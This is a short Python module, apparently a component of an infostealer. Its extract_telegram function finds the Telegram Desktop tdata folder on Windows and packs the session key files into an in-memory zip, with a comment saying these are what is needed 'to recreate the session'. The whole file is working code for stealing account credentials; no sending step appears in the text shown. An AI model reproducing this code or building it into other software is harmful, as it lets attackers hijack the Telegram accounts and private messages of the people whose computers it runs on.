import os
import shutil
import zipfile
import io
import getpass
from .utils import expand_path

def extract_telegram():
    tdata_paths = [
        os.path.join(os.environ.get('APPDATA', ''), 'Telegram Desktop', 'tdata'),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Telegram Desktop', 'tdata')
    ]
    
    found_tdata = None
    for path in tdata_paths:
        if os.path.exists(path):
            found_tdata = path
            break
            
    if not found_tdata:
        return None
        
    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # We only need specific session files to recreate the session
            # Key files are D877F783D5D3EF8C folders and some map files
            for root, dirs, files in os.walk(found_tdata):
                # Filter to only capture session-critical files to keep zip small
                for file in files:
                    if len(file) == 16 or file == "key_datas" or file == "settingss":
                        file_path = os.path.join(root, file)
                        # Avoid huge files
                        if os.path.getsize(file_path) < 1024 * 1024:
                            arcname = os.path.relpath(file_path, found_tdata)
                            zipf.write(file_path, arcname=arcname)
                    
                # Only go 2 levels deep
                if root.count(os.sep) - found_tdata.count(os.sep) > 1:
                    break
                    
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except:
        return None
